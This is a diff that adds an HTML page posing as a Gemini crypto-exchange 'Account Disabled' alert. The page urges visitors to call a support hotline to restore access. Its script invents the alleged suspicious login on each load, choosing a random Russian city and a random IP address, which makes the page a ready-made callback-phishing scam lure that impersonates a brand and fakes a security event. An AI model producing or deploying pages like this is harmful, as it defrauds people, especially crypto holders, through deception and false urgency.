@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Disabled | Gemini® | Crypto Exchange</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
+            background-color: #ffffff;
+            color: #1a1a1a;
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            background-color: #ffffff;
+        }
+
+        /* Header */
+        .header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 70px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 40px;
+            background-color: white;
+            border-bottom: 1px solid #f0f0f0;
+            z-index: 100;
+        }
+
+        .gemini-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #1a1a1a;
+        }
+
+        .gemini-logo svg {
+            width: 28px;
+            height: 28px;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        /* Main Content */
+        .main-content {
+            margin-top: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: calc(100vh - 70px);
+            padding: 40px 20px;
+        }
+
+        .alert-wrapper {
+            width: 100%;
+            max-width: 540px;
+        }
+
+        .alert-card {
+            background-color: #fef5f5;
+            border: 1px solid #f0d0d0;
+            border-radius: 12px;
+            padding: 40px;
+            text-align: center;
+        }
+
+        .alert-icon {
+            width: 80px;
+            height: 80px;
+            background-color: #ffe8e8;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            font-size: 40px;
+        }
+
+        .alert-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #d32f2f;
+            margin-bottom: 12px;
+        }
+
+        .alert-subtitle {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 24px;
+            line-height: 1.6;
+        }
+
+        /* Details Section */
+        .details-section {
+            background-color: #fff5f5;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 24px 0;
+            text-align: left;
+        }
+
+        .details-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 16px;
+        }
+
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #f0d0d0;
+            font-size: 14px;
+        }
+
+        .detail-item:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            color: #666;
+            font-weight: 500;
+        }
+
+        .detail-value {
+            color: #1a1a1a;
+            font-weight: 600;
+            word-break: break-all;
+            text-align: right;
+            max-width: 200px;
+        }
+
+        /* Action Section */
+        .action-section {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #f0d0d0;
+        }
+
+        .action-title {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 16px;
+        }
+
+        .support-box {
+            background-color: #f5f5f5;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .support-label {
+            font-size: 12px;
+            color: #999;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+
+        .support-phone {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 4px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .support-hours {
+            font-size: 13px;
+            color: #666;
+        }
+
+        .contact-buttons {
+            display: flex;
+            gap: 12px;
+            flex-direction: column;
+        }
+
+        .contact-btn {
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .call-btn {
+            background-color: #d32f2f;
+            color: white;
+        }
+
+        .call-btn:hover {
+            background-color: #b71c1c;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.2);
+        }
+
+        .email-btn {
+            background-color: #f5f5f5;
+            color: #1a1a1a;
+            border: 1px solid #d0d0d0;
+        }
+
+        .email-btn:hover {
+            background-color: #efefef;
+            transform: translateY(-2px);
+        }
+
+        /* Warning Message */
+        .warning-message {
+            background-color: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 16px;
+            border-radius: 4px;
+            margin-top: 24px;
+            font-size: 13px;
+            color: #856404;
+            line-height: 1.6;
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            font-size: 13px;
+            color: #999;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #d0d0d0;
+        }
+
+        .divider span {
+            padding: 0 16px;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header {
+                padding: 0 20px;
+                height: 60px;
+            }
+
+            .main-content {
+                margin-top: 60px;
+                min-height: calc(100vh - 60px);
+                padding: 30px 16px;
+            }
+
+            .alert-wrapper {
+                max-width: 100%;
+            }
+
+            .alert-card {
+                padding: 30px 20px;
+            }
+
+            .alert-title {
+                font-size: 24px;
+            }
+
+            .alert-icon {
+                width: 70px;
+                height: 70px;
+                font-size: 36px;
+                margin-bottom: 20px;
+            }
+
+            .gemini-logo {
+                gap: 6px;
+                font-size: 16px;
+            }
+
+            .gemini-logo svg {
+                width: 24px;
+                height: 24px;
+            }
+
+            .detail-value {
+                max-width: 150px;
+            }
+
+            .support-phone {
+                font-size: 20px;
+            }
+
+            .contact-buttons {
+                flex-direction: column;
+            }
+
+            .contact-btn {
+                width: 100%;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                padding: 0 16px;
+                height: 56px;
+            }
+
+            .main-content {
+                margin-top: 56px;
+                min-height: calc(100vh - 56px);
+                padding: 24px 16px;
+            }
+
+            .alert-card {
+                padding: 24px 16px;
+            }
+
+            .alert-title {
+                font-size: 22px;
+            }
+
+            .alert-subtitle {
+                font-size: 14px;
+                margin-bottom: 20px;
+            }
+
+            .alert-icon {
+                width: 60px;
+                height: 60px;
+                font-size: 32px;
+                margin-bottom: 16px;
+            }
+
+            .details-section {
+                padding: 16px;
+                margin: 20px 0;
+            }
+
+            .detail-item {
+                flex-direction: column;
+                align-items: flex-start;
+                padding: 12px 0;
+            }
+
+            .detail-value {
+                width: 100%;
+                text-align: left;
+                margin-top: 4px;
+            }
+
+            .support-box {
+                padding: 16px;
+            }
+
+            .support-phone {
+                font-size: 18px;
+            }
+
+            .support-hours {
+                font-size: 12px;
+            }
+
+            .action-section {
+                margin-top: 24px;
+                padding-top: 20px;
+            }
+
+            .contact-btn {
+                padding: 12px;
+                font-size: 14px;
+            }
+
+            .warning-message {
+                font-size: 12px;
+                padding: 12px;
+                margin-top: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="gemini-logo">
+            <svg viewBox="0 0 129.33 128.94" xmlns="http://www.w3.org/2000/svg">
+                <path d="M83.86 2a43.53 43.53 0 00-43 38.64 43.26 43.26 0 004.63 86.28 43.53 43.53 0 0043-38.64A43.26 43.26 0 0083.86 2zM117 50.17a33.7 33.7 0 01-28.25 28.24V50.17zM12.35 78.77a33.69 33.69 0 0128.24-28.23v28.23zm66.25 9.78a33.48 33.48 0 01-66.25 0zm.4-38.38v28.6H50.37v-28.6zm38-9.78H50.73a33.48 33.48 0 0166.25 0z" fill="#26ddf9"/>
+            </svg>
+            Gemini
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <div class="alert-wrapper">
+            <div class="alert-card">
+                <div class="alert-icon">🔒</div>
+
+                <h1 class="alert-title">Account Disabled</h1>
+                <p class="alert-subtitle">
+                    Your account has been temporarily disabled due to a suspicious login attempt from an unauthorized location.
+                </p>
+
+                <!-- Details Section -->
+                <div class="details-section">
+                    <div class="details-title">Suspicious Activity Detected</div>
+                    
+                    <div class="detail-item">
+                        <span class="detail-label">Location</span>
+                        <span class="detail-value" id="detectedLocation">Russia</span>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <span class="detail-label">IP Address</span>
+                        <span class="detail-value" id="detectedIP">192.168.1.127</span>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <span class="detail-label">Time Detected</span>
+                        <span class="detail-value" id="detectedTime">Just now</span>
+                    </div>
+                </div>
+
+                <!-- Action Section -->
+                <div class="action-section">
+                    <p class="action-title">Contact our support team to restore access:</p>
+                    
+                    <div class="support-box">
+                        <div class="support-label">24/7 Support Hotline</div>
+                        <div class="support-phone">+1 (888) 246-5357</div>
+                        <div class="support-hours">Available 24 hours, 7 days a week</div>
+                    </div>
+
+                    <div class="contact-buttons">
+                        <button class="contact-btn call-btn" onclick="initiateCall()">
+                            📞 Call Support Now
+                        </button>
+                        <button class="contact-btn email-btn" onclick="initiateEmail()">
+                            📧 Email Support Team
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Warning Message -->
+                <div class="warning-message">
+                    <strong>⚠️ Important:</strong> Never share your password or security codes with anyone. Gemini support will never ask for these details via email or phone.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Generate random IP address
+        function generateRandomIP() {
+            return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join('.');
+        }
+
+        // Generate random location (Russian cities)
+        const russianLocations = [
+            'Moscow, Russia',
+            'Saint Petersburg, Russia',
+            'Novosibirsk, Russia',
+            'Yekaterinburg, Russia',
+            'Vladivostok, Russia',
+            'Sochi, Russia',
+            'Kazan, Russia',
+            'Nizhny Novgorod, Russia'
+        ];
+
+        function getRandomLocation() {
+            return russianLocations[Math.floor(Math.random() * russianLocations.length)];
+        }
+
+        // Get current time
+        function getCurrentTime() {
+            const now = new Date();
+            return now.toLocaleString('en-US', {
+                year: 'numeric',
+                month: 'short',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: true
+            });
+        }
+
+        // Initialize page with random data
+        function initializePage() {
+            document.getElementById('detectedLocation').textContent = getRandomLocation();
+            document.getElementById('detectedIP').textContent = generateRandomIP();
+            document.getElementById('detectedTime').textContent = getCurrentTime();
+        }
+
+        // Call support
+        function initiateCall() {
+            const phone = '+18882465357';
+            // Create tel link (works on mobile devices)
+            window.location.href = 'tel:' + phone;
+            
+            // Fallback: Show alert on non-mobile
+            if (!navigator.userAgent.match(/Android|iPhone|iPad|iPod/i)) {
+                alert('Call Support: +1 (888) 246-5357\n\nPlease contact this number to restore your account access.');
+            }
+        }
+
+        // Email support
+        function initiateEmail() {
+            const email = 'security@gemini.com';
+            const subject = 'Account Disabled - Security Review Request';
+            const body = 'Hello,\n\nI need to restore access to my disabled Gemini account.\n\nPlease contact me as soon as possible.\n\nThank you.';
+            
+            window.location.href = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+        }
+
+        // Initialize on page load
+        window.addEventListener('DOMContentLoaded', initializePage);
+    </script>
+</body>
+</html>
